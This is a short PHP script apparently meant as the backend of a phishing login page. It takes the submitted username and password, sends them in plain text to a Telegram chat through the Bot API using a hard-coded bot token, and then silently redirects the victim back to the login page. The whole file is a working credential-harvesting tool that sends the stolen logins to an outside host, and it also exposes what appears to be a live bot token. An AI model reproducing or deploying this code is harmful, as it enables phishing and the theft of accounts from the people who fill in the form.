


<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    
    $message = "Username: " . $username . "\nPassword: " . $password;

    $botToken = "7483746513:AAETGFmjR-OcqiCHnjxeoK2eo4ahN00eB5I";
    $chatId = "-1002188442823";

    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result === FALSE) { /* Handle error */ }

    // Redirect to a success page (or the original login page)
    header("Location: login.html");
    exit();
}
?>
